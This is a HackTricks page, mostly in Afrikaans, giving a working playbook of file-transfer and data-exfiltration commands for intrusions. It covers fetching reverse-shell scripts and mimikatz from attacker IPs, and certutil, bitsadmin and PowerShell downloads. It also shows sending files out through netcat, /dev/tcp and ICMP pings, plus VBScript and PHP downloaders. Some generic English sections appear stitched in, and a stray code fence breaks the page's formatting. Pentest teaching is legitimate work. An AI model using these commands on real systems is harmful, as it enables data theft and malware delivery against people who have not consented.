# Uitlekking

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Gewoonlik toegelate domeine om inligting uit te lek

Kyk na [https://lots-project.com/](https://lots-project.com/) om gewoonlik toegelate domeine te vind wat misbruik kan word

## Kopieer & Plak Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Laai lêers op

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS-bediener**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP-bediener (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP-bediener (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP-bediener (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** kliënt
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali as bediener
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Of skep 'n smb-deel **met behulp van samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
### Exfiltration

#### Introduction

Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:

- **Email**: Sending sensitive data as email attachments.
- **FTP**: Uploading data to an FTP server.
- **DNS**: Sending data encoded in DNS queries.
- **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
- **Cloud Storage**: Uploading data to cloud storage services.

#### Techniques

1. **Compression**: Compressing data before exfiltration to reduce size and avoid detection.
2. **Encryption**: Encrypting data to prevent unauthorized access.
3. **Steganography**: Hiding data within other files to avoid detection.
4. **Data Fragmentation**: Splitting data into smaller fragments for exfiltration.
5. **Data Obfuscation**: Encoding data to make it unreadable without decoding.

#### Tools

- **Netcat**: A versatile networking tool that can be used for exfiltration.
- **Curl**: Command-line tool for transferring data with various protocols.
- **Wget**: Another command-line tool for downloading files from the web.
- **FTP Clients**: Software for uploading files to FTP servers.
- **Cloud Storage APIs**: APIs provided by cloud storage services for data transfer.

#### Countermeasures

- **Data Loss Prevention (DLP)**: Implement DLP solutions to monitor and prevent data exfiltration.
- **Network Segmentation**: Segment networks to limit unauthorized access to sensitive data.
- **Encryption**: Encrypt data at rest and in transit to protect it from unauthorized access.
- **User Training**: Educate users about the risks of data exfiltration and how to prevent it.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Die aanvaller moet SSHd aan die gang hê.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Indien die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller koppel.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

### Netcat

Netcat is a versatile networking utility that can be used for various purposes, including transferring files, port scanning, and creating reverse shells. It can also be used for exfiltration by sending data over the network to an external server controlled by the attacker.

#### Exfiltration with Netcat

To exfiltrate data using Netcat, the attacker sets up a listener on a remote server using the following command:

```bash
nc -l -p <port> > output.file
```

Next, on the compromised machine, the attacker pipes the data to be exfiltrated into Netcat using a command similar to the following:

```bash
cat sensitive.file | nc <remote_ip> <port>
```

This command sends the contents of `sensitive.file` to the remote server listening on `<remote_ip>` and `<port>`. The data is then saved to `output.file` on the remote server.

Netcat can be a powerful tool for exfiltrating data during a penetration test, but it is essential to ensure that the exfiltration process is stealthy to avoid detection by security measures.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Laai lêer af van slagoffer
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Laai lêer na slagoffer op
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Dankie aan **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

As jy data na 'n SMTP-bediener kan stuur, kan jy 'n SMTP skep om die data met Python te ontvang:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Standaard in XP en 2003 (in ander moet dit uitdruklik tydens installasie bygevoeg word)

In Kali, **begin TFTP-bediener**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP-bediener in Python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
In **slagoffer**, verbind met die Kali-bediener:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Laai 'n lêer af met 'n PHP eenlynstuk:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript is 'n skripsie taal wat deur Microsoft ontwikkel is en dikwels gebruik word vir Windows-gebaseerde skripsies en automatiseringstake. VBScript kan gebruik word vir die uitvoer van data-ekstraksie deur die gebruik van HTTP-aanvrae of e-posse.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Slagoffer**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Die `debug.exe` program maak dit nie net moontlik om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, `debug.exe` die binêre lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
```markdown
Dan kopieer en plak die teks in die Windows-skootrekenaar en 'n lêer genaamd nc.exe sal geskep word.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
```
